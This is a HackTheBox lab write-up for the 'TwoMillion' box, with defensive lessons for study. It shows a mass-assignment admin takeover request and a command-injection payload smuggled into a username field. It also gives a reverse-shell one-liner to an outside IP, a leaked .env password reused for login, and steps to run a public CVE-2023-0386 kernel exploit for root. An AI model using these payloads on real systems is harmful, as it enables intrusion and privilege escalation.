---
title: "TwoMillion"
date: 2023-06-06
type: docs
tags:
  - htb
  - linux
  - easy
  - api
  - js-deobfuscation
  - mass-assignment
  - idor
  - command-injection
  - env-file
  - password-reuse
  - cve-2023-0386
  - overlayfs
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Ubuntu 22.04), **Difficulty:** Easy, **Released:** 2023-06-06, **IP:** `10.10.11.221` , `2million.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. This is a recreation of the old HackTheBox invite page. Deobfuscate its JavaScript, call `POST /api/v1/invite/generate` for a code, and register.
2. Enumerate `/api/v1`. `PUT /api/v1/admin/settings/update` accepts an undocumented **`is_admin`** field (**mass assignment**), which flips your account to admin.
3. `POST /api/v1/admin/vpn/generate` puts `username` into a shell command. **Command injection** (`baphomet;id;`) gives a shell as `www-data`.
4. `/var/www/html/.env` holds DB creds `admin : SuperDuperPass123`, reused for the local `admin` account (`su admin`).
5. A mail to `admin` warns about an OverlayFS / FUSE kernel CVE. **CVE-2023-0386** gets root.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| `.env` (DB, reused for the `admin` user) | `admin : SuperDuperPass123` |
| `user.txt` | `/home/admin/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

TwoMillion is an **API box** end to end. The foothold has three separate API sins in a row: an endpoint that mints its own invite codes, **mass assignment** on the settings update (the client can set fields the server never intended, here `is_admin`), and **command injection** in an admin action. Each is a real world OWASP API Top 10 item. The privesc is a topical kernel CVE, **CVE-2023-0386**, an OverlayFS `setuid` copy-up bug that was fresh when the box released. The lesson thread is "the server must decide what the client is allowed to do, and must never trust a field just because it arrived in the request".

Related API / mass-assignment boxes: [Rabbit Store](/writeups/tryhackme/linux/medium/rabbit-store/), [Interface](/writeups/hackthebox/linux/medium/interface/), [Takedown](/writeups/tryhackme/linux/insane/takedown/). Related command injection: [Nocturnal](/writeups/hackthebox/linux/easy/nocturnal/), [Previse](/writeups/hackthebox/linux/easy/previse/), [Headless](/writeups/hackthebox/linux/medium/headless/). Related kernel-CVE-to-root: [Analytics](/writeups/hackthebox/linux/easy/analytics/) (GAMEOVERLAY).

---

## Full Walkthrough

![Pasted image 20240207164418](Pasted-image-20240207164418.png)

We find an alternative domain to the machine.

The invite page uses obfuscated JS. Beautify it (`js-beautify`, or the browser dev tools), and you find it calls `/api/v1/invite/how/to/generate`, which returns a ROT13 hint, then `POST /api/v1/invite/generate` returns a base64 code.

```bash
curl -s -X POST http://2million.htb/api/v1/invite/generate | jq -r .data.code | base64 -d
```

Register with that code, log in, then map the API:

```bash
curl -s http://2million.htb/api/v1 -H "Cookie: PHPSESSID=..." | jq        # lists routes
curl -s http://2million.htb/api/v1/admin -H "Cookie: PHPSESSID=..." | jq   # admin routes
```

![Pasted image 20240207182824](Pasted-image-20240207182824.png)

we check the endpoint `/api/v1/admin/auth` (returns `{"message":false}` for a normal user).

### Mass assignment, become admin

![Pasted image 20240207183515](Pasted-image-20240207183515.png)

`PUT /api/v1/admin/settings/update` first complains that `email` is missing, then that `is_admin` is missing, then that `is_admin` must be `0` or `1`. So the server is reading `is_admin` straight from the body:

```http
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
Cookie: PHPSESSID=i1i7usod2hs92bbjtd1k3ca0qv
Content-Type: application/json

{"email":"baphomet@2million.htb","is_admin":1}
```

<div class="callout callout-note">

**Mass assignment**

The endpoint does something like `User::where(...)->update($request->all())`. It takes every field the client sent and writes it to the row, including `is_admin`, which no legitimate client would ever send. The fix is an allowlist: only ever update the specific columns the feature is meant to change. Errors that helpfully tell you the next required field (`is_admin is required`, `is_admin must be 0 or 1`) make it trivial to discover.

</div>

`GET /api/v1/admin/auth` now returns `true`.

### Command injection in vpn/generate

```http
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
Cookie: PHPSESSID=i1i7usod2hs92bbjtd1k3ca0qv
Content-Type: application/json

{"username":"baphomet;id;"}
```

got RCE.

<div class="callout callout-note">

**Command injection**

The VPN generator shells out to `openvpn`/`bash` with the username interpolated (`... "$username" ...`). `;` closes the intended command and starts yours. Swap `id` for `bash -c 'bash -i >& /dev/tcp/10.10.14.238/9001 0>&1'` and catch a shell as `www-data`.

</div>

### www-data to admin

```bash
www-data@2million:~/html$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

The `users` table has bcrypt hashes (not needed), and the DB password is reused:

```bash
su admin        # SuperDuperPass123
```

`user.txt` is here. There is a memcached instance on `127.0.0.1:11211` (tunnel with chisel if you want to poke it), but it is a distraction. Read the mail:

```
From: ch4p <ch4p@2million.htb>
Subject: Urgent: Patch System OS

... can you also upgrade the OS on our web host? There have been a few serious
Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty.
```

### Privilege Escalation, CVE-2023-0386

<div class="callout callout-note">

**CVE-2023-0386, OverlayFS setuid copy-up**

On kernels before the fix, when an overlay mount has a lower directory containing a **setuid root** binary and an unprivileged user in a user namespace copies that file up to the writable upper layer, the kernel preserves the setuid bit and the root ownership on the copied file even though the user had no right to create a root-owned setuid file. You mount an overlay where the lower dir has a setuid `bash`, trigger a copy-up, then execute the upper-layer file with `-p`. The public PoC (`sxlmnwb/CVE-2023-0386`) does all of it: run `./fuse ./ovlcap/lower ./gc` in one terminal and `./exp` in another.

</div>

I first tried CVE-2021-3493 (also OverlayFS, older). It did not work on this kernel. CVE-2023-0386 did:

```bash
git clone https://github.com/sxlmnwb/CVE-2023-0386 && cd CVE-2023-0386 && make
# terminal 1
./fuse ./ovlcap/lower ./gc
# terminal 2
./exp
# -> root shell
cat /root/root.txt
```

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/admin/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons and Takeaways

- **Allowlist writable fields.** Never pass `request.all()` into an update. Mass assignment turns a settings form into privilege escalation.
- **Do not shell out with user input.** Build an argv array, or strictly validate the username against `^[a-zA-Z0-9_]+$`.
- **Rate limit and authenticate invite generation.** An endpoint that hands out its own invite codes is not access control.
- **`.env` in the web root is a liability.** Keep it out of the document root and off `www-data` readable perms where possible, and never reuse the DB password for a login account.
- **Patch the kernel.** OverlayFS/nsfs/io_uring LPEs land every few months.

---

## Related Writeups

- **API abuse / mass assignment / IDOR:** [Rabbit Store](/writeups/tryhackme/linux/medium/rabbit-store/), [Interface](/writeups/hackthebox/linux/medium/interface/), [Takedown](/writeups/tryhackme/linux/insane/takedown/)
- **Command injection:** [Nocturnal](/writeups/hackthebox/linux/easy/nocturnal/), [Previse](/writeups/hackthebox/linux/easy/previse/), [Headless](/writeups/hackthebox/linux/medium/headless/)
- **`.env` to DB to password reuse:** [Nocturnal](/writeups/hackthebox/linux/easy/nocturnal/), [Cat](/writeups/hackthebox/linux/medium/cat/)
- **Kernel LPE to root:** [Analytics](/writeups/hackthebox/linux/easy/analytics/)

## References

- CVE-2023-0386 (OverlayFS) <https://ubuntu.com/security/CVE-2023-0386>
- OWASP API Security Top 10 <https://owasp.org/API-Security/>
- PoC: sxlmnwb/CVE-2023-0386 <https://github.com/sxlmnwb/CVE-2023-0386>
